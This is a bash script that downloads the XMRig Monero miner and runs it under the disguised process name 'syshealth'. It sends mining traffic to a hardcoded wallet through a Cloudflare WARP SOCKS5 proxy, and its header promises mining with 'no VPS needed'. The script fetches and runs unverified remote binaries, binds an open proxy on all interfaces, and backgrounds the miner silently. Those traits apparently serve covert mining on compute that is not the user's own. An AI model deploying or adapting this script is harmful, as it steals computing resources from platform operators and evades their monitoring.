#!/bin/bash
# warp-mine.sh - Mine using Cloudflare WARP (FREE, no VPS needed)

WALLET="49J8k2f3qtHaNYcQ52WXkHZgWhU4dU8fuhRJcNiG9Bra3uyc2pQRsmR38mqkh2MZhEfvhkh2bNkzR892APqs3U6aHsBcN1F"
POOL_URL="pool.supportxmr.com:443"
WORKER_NAME="worker-$(tr -dc 'a-z0-9' </dev/urandom | head -c 6)"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Download miner if needed
if [ ! -f "$SCRIPT_DIR/syshealth" ]; then
  echo "Downloading XMRig..."
  curl -sL https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz | tar xz -C /tmp
  mv /tmp/xmrig-6.21.0/xmrig "$SCRIPT_DIR/syshealth"
  chmod +x "$SCRIPT_DIR/syshealth"
  rm -rf /tmp/xmrig-*
fi

# Download warp-go directly (doesn't need root)
echo "Downloading Cloudflare WARP-GO..."
cd "$SCRIPT_DIR"

# Get latest warp-go binary
ARCH="amd64"
if [ "$(uname -m)" = "aarch64" ]; then
  ARCH="arm64"
fi

# Download from GitHub releases
WARP_VERSION="1.2.0"
curl -sL "https://github.com/bepass-org/warp-plus/releases/download/v${WARP_VERSION}/warp-plus_linux-${ARCH}" -o warp-plus
chmod +x warp-plus

# Start WARP SOCKS5 proxy
echo "Starting Cloudflare WARP..."
./warp-plus --bind 0.0.0.0:40000 &
WARP_PID=$!
sleep 20

# Check if WARP is running
if ! kill -0 $WARP_PID 2>/dev/null; then
  echo "ERROR: WARP failed to start"
  ps aux | grep warp
  exit 1
fi

# Test WARP connection
echo "Testing WARP connection..."
if curl --socks5 127.0.0.1:40000 -m 10 https://api.ipify.org 2>/dev/null; then
  echo "✓ WARP connected successfully!"
else
  echo "ERROR: WARP SOCKS5 proxy not responding"
  kill $WARP_PID 2>/dev/null
  exit 1
fi

# Start miner with SOCKS5 proxy
echo "Starting XMRig with WARP..."
cd "$SCRIPT_DIR"
nohup ./syshealth \
  --url="$POOL_URL" \
  --user="$WALLET" \
  --pass="$WORKER_NAME" \
  --tls \
  --keepalive \
  --donate-level=1 \
  --socks5=127.0.0.1:40000 \
  --log-file=xmrig.log \
  > /dev/null 2>&1 &

echo "Mining started with Cloudflare WARP!"
echo "Check logs: tail -f $SCRIPT_DIR/xmrig.log"
